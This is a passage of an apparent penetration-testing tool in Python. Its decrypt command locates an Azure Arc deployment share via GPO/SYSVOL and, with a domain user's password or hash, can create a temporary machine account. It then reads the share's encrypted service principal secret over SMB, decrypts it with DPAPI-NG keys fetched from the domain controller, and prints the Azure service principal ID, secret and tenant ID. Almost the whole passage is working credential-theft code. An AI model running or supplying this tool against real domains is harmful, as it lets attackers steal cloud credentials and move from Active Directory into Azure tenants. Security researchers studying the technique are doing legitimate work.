            enc_cek_parameters    = ri.key_encryption_algorithm.parameters,
            enc_content           = enc_content,
            enc_content_algorithm = eci.algorithm.algorithm,
            enc_content_parameters= eci.algorithm.parameters,
        ))

    if not recipients:
        raise ValueError("No DPAPI-NG KEKRecipientInfo found in blob")

    dbg("DEC", _info, f"{len(recipients)} recipient(s) in blob - trying each")

    cache = KeyCache()
    errors = []
    for idx, b in enumerate(recipients):
        try:
            target_sd = b.protection_descriptor.get_target_sd()
            rk = cache._get_key(
                target_sd,
                b.key_identifier.root_key_identifier,
                b.key_identifier.l0, b.key_identifier.l1, b.key_identifier.l2,
            )
            if not rk:
                srv = server or lookup_dc(b.key_identifier.domain_name).target
                rk = _sync_get_key(
                    srv, target_sd,
                    b.key_identifier.root_key_identifier,
                    b.key_identifier.l0, b.key_identifier.l1, b.key_identifier.l2,
                    username=username, password=password, auth_protocol=auth_protocol,
                )
            if not rk.is_public_key:
                cache._store_key(target_sd, rk)
            return _decrypt_blob(b, rk), idx
        except Exception as e:
            dbg("DEC", _warn, f"recipient[{idx}] failed: {e}")
            errors.append(f"recipient[{idx}]: {e}")

    raise RuntimeError("all recipients failed:\n    " + "\n    ".join(errors))


def _discover_share(dc, domain, username, password):
    """
    Reuse the `find` GPO/SYSVOL logic to locate the Arc deployment share UNC.
    Returns the chosen share UNC string, or None if nothing was found.
    """
    dbg("FIND", _info, "Auto-discovering share via GPO/SYSVOL ...")
    _, _, extracted = check_gpo_and_sysvol(dc, domain, username, password)

    # dedupe by UNC - multiple GPOs may point at the same share
    seen, uniq = set(), []
    for s in extracted:
        key = s["unc"].lower()
        if key not in seen:
            seen.add(key)
            uniq.append(s)

    if not uniq:
        dbg("FIND", _bad, "No shares found via GPO discovery")
        return None
    if len(uniq) > 1:
        pline("FIND", _warn, f"{len(uniq)} shares found - using first")
    dbg("FIND", _good, f"Using share: {uniq[0]['unc']}")
    return uniq[0]["unc"]


def _print_psm1_excerpt(psm1_str):
    """Print the DpapiNgUtil class excerpt (or relevant API lines) from the .psm1."""
    section("AzureArcDeployment.psm1 - DpapiNgUtil")
    lines = psm1_str.splitlines()
    start = next((i for i, l in enumerate(lines)
                  if "DpapiNgUtil" in l or ("Add-Type" in l and "DpapiNg" in l)), None)
    if start is not None:
        # show up to 200 lines from the class definition
        for line in lines[start:start + 200]:
            print(f"  {DIM}{line}{RESET}")
    else:
        # fallback: show every line that mentions a relevant API
        keywords = ("DpapiNg", "NCrypt", "Unprotect", "Protect", "ProtectedData",
                    "DllImport", "DataProtect", "AesKw", "KeyWrap")
        hits = [l for l in lines if any(kw in l for kw in keywords)]
        for line in hits[:60]:
            print(f"  {DIM}{line}{RESET}")
    print()


def _decode_secret_blob(raw):
    """Try base64, hex, then raw decoding of `raw`. Returns blob bytes or None."""
    for strategy, fn in [
        ("base64", lambda r: base64.b64decode(r)),
        ("hex",    lambda r: bytes.fromhex(r.decode("ascii", errors="ignore").strip())),
        ("raw",    lambda r: r),
    ]:
        with contextlib.suppress(Exception):
            blob = fn(raw)
            dbg("DEC", _good, f"Decoded blob ({len(blob)} bytes, {strategy})")
            return blob
    return None


def cmd_decrypt(args):
    """
    Decrypt the encryptedServicePrincipalSecret from the Arc deployment share.

    Auth modes:
      --auto        auto-create a machine account using domain user creds (-u/-p)
      -u MACHINE$   explicit machine account creds with -p
    """
    try:
        import dpapi_ng
    except ImportError:
        print(_bad("dpapi-ng not installed - run: pip install dpapi-ng"))
        sys.exit(1)

    if not HAS_IMPACKET:
        print(_bad("impacket not installed - run: pip install impacket"))
        sys.exit(1)

    domain    = args.d
    dc        = getattr(args, "dc_ip", "") or ""
    share_unc = args.share
    auto      = getattr(args, "auto", False)
    username  = getattr(args, "u", "") or ""
    password  = getattr(args, "p", "") or _normalize_hash(getattr(args, "hash", "")) or ""

    # validate: need exactly one auth mode
    if not auto and not username:
        print(_bad("Specify an auth mode: -auto -u <domain_user> -p <pass>|-H <hash>  |  -u <MACHINE$> -p <pass>|-H <hash>"))
        sys.exit(1)

    banner()
    print(f"  {_info(f'Domain : {domain}')}")
    print(f"  {_info(f'DC     : {dc}')}")
    if share_unc:
        print(f"  {_info(f'Share  : {share_unc}')}")
    else:
        print(f"  {_info('Share  : (auto-discover via GPO/SYSVOL)')}")

    if auto:
        print(f"  {_info(f'Mode   : auto (temp machine account as {domain}\\{username})')}")
    else:
        print(f"  {_info(f'Mode   : NTLM machine account {domain}\\{username}')}")

    if CONFIG["verbose"]:
        try:
            import importlib.metadata as _im
            _ver = _im.version("dpapi-ng")
            print(f"  {_info(f'dpapi-ng : {_ver}')}")
        except Exception:
            pass
    print()

    # auto-discover the share
    if not share_unc:
        # Discover with the same creds we'll use for SMB/LDAP: the domain user
        # (auto mode) or machine account (-u mode).
        disc_user = username or None
        disc_pass = password or None
        share_unc = _discover_share(dc, domain, disc_user, disc_pass)
        if not share_unc:
            print(_bad("Could not auto-discover an Arc share - pass -share <UNC> explicitly"))
            sys.exit(1)
        print(f"  {_info(f'Share  : {share_unc}')}")
        print()

    # parse share UNC
    parts = share_unc.lstrip("\\").split("\\")
    if len(parts) < 2:
        print(_bad(f"Invalid share UNC: {share_unc}"))
        sys.exit(1)
    share_server = parts[0]
    share_name   = parts[1]
    dbg("DEC", _info, f"Share server: {share_server}, share name: {share_name}")

    # create machine account
    machine_user = None
    machine_pass = None
    cleanup_account = False

    if auto:
        if not username or not password:
            print(_bad("-auto requires -u <domain_user> -p <password>|-H <hash>"))
            sys.exit(1)
        dbg("DEC", _info, "Auto mode: creating temp machine account ...")
        try:
            machine_user, machine_pass = _create_machine_account(
                domain, dc, username, password
            )
            cleanup_account = True
        except Exception as e:
            print(_bad(f"Failed to create machine account: {repr(e)}"))
            if CONFIG["verbose"]:
                traceback.print_exc()
            print(_warn("Check Machine Account Quota (ms-DS-MachineAccountQuota) and user permissions"))
            sys.exit(1)
    else:
        dbg("DEC", _info, f"Using explicit machine account: {domain}\\{username}")
        machine_user = username
        machine_pass = password

    try:
        dbg("SMB", _info, f"Connecting to {share_unc} ...")

        smb_user = machine_user or ""
        smb_pass = machine_pass or ""
        smb = smb_connect(share_server, domain, smb_user or None, smb_pass or None,
                          fallback_ip=dc)


        if smb is None:
            print(_bad(f"Could not connect to {share_server}"))
            sys.exit(1)

        dbg("DEC", _info, "Reading deployment files from share ...")
        secret_raw, arcinfo_raw, psm1_str = _read_share_files(smb, share_name)
        smb.logoff()
        dbg("DEC", _info, f"Share read complete: secret={'yes' if secret_raw else 'no'}, "
                          f"arcinfo={'yes' if arcinfo_raw else 'no'}, psm1={'yes' if psm1_str else 'no'}")

        if psm1_str and CONFIG["verbose"]:
            _print_psm1_excerpt(psm1_str)

        if secret_raw is None:
            print(_bad("Could not read encryptedServicePrincipalSecret from share"))
            print(_warn("Machine account may not have read access to the share"))
            sys.exit(1)

        # decode blob
        dbg("DEC", _info, f"Raw file: {len(secret_raw)} bytes, first 16: {secret_raw[:16].hex()}")
        raw = decode_pwsh_bytes(secret_raw).encode("ascii", errors="ignore")
        blob = _decode_secret_blob(raw)
        if blob is None:
            print(_bad("Could not decode encryptedServicePrincipalSecret"))
            sys.exit(1)

        if b"\x2b\x06\x01\x04\x01\x82\x37\x4a\x01" not in blob:
            pline("DEC", _warn, "No DPAPI-NG key-attr in blob - may be cert-based "
                                "Protect-CmsMessage (needs the recipient cert+key)")

        if CONFIG["verbose"]:
            dbg("DEC", _info, f"Blob header (32 b): {blob[:32].hex()}")
            oid = _asn1_first_oid(blob)
            if oid:
                dbg("DEC", _info, f"Content-type OID : {oid} (PKCS#7 EnvelopedData - normal for DPAPI-NG)")

        dump_path = getattr(args, "dump_blob", None)
        if dump_path:
            with open(dump_path, "wb") as fh:
                fh.write(blob)
            pline("DEC", _good, f"Blob saved to {dump_path}")

        # DPAPI-NG decrypt
        pline("DEC", _info, "Trying to decrypt with DPAPI-NG...")
        pline("DEC", _info, "Fetching GKDI key from Domain Controller...")
        dbg("DEC", _info, f"GKDI GetKey → {dc} ...")
        try:
            plaintext, _ridx = _unprotect_dpapi_ng(
                blob,
                server        = dc or share_server,
                username      = f"{domain}\\{machine_user}",
                password      = machine_pass,
                auth_protocol = "ntlm",
            )
            dbg("DEC", _info, f"Unwrapped via recipient[{_ridx}]")
            secret = plaintext.decode("utf-8", errors="ignore").rstrip("\x00")
        except Exception as e:
            print(_bad(f"Decryption failed: :( {e}"))
            err = str(e).lower()
            if "all recipients failed" in err and ("access" in err or "denied" in err or "permitted" in err):
                print(_warn("GKDI GetKey was reached but refused every recipient."))
                print(f"    The account may not be a member of any SID the secret was protected to.")
                print(f"    Arc protects to Domain Computers / Domain Controllers;")
                print(f"    confirm the account's group membership.")
            elif "not in the expected format" in err:
                print(_warn("Blob did not match the DPAPI-NG EnvelopedData layout."))
                print(f"    Dump it with --dump-blob and inspect with diag_blob.py.")
            else:
                print(_warn("Common causes:"))
                print(f"    - Account not in any SID the secret was protected to")
                print(f"    - RPC ports 135 + dynamic range not reachable to {dc}")
                print(f"    - Expired or invalid credentials")
            sys.exit(1)

        section("Result")
        print(f"  {_good('Decryption successful!')}")
        print()

        # Parse ArcInfo.json for SP ID and Tenant ID
        arc_info  = {}
        sp_id     = ""
        tenant_id = ""
        if arcinfo_raw:
            dbg("DEC", _info, "Parsing ArcInfo.json ...")
            with contextlib.suppress(Exception):
                arc_info  = json.loads(arcinfo_raw)
                sp_id     = arc_info.get("ServicePrincipalClientId", "")
                tenant_id = arc_info.get("TenantId", "")
            dbg("DEC", _good, f"SP ID: {sp_id or 'N/A'}, Tenant ID: {tenant_id or 'N/A'}")
        else:
            pline("SMB", _warn, "ArcInfo.json was not found on the share - SP ID and Tenant ID unavailable")

        if sp_id:
            print(f"  {BOLD}Service Principal ID:{RESET} {GREEN}{sp_id}{RESET}")
        print(f"  {BOLD}Service Principal Secret:{RESET} {GREEN}{secret}{RESET}")
        if tenant_id:
            print(f"  {BOLD}Tenant ID:{RESET} {GREEN}{tenant_id}{RESET}")
        
        print()

    finally:
        if cleanup_account:
            print(_warn(f"Note: machine account {machine_user} was created - clean up required"))
            print()


if __name__ == "__main__":
    main()
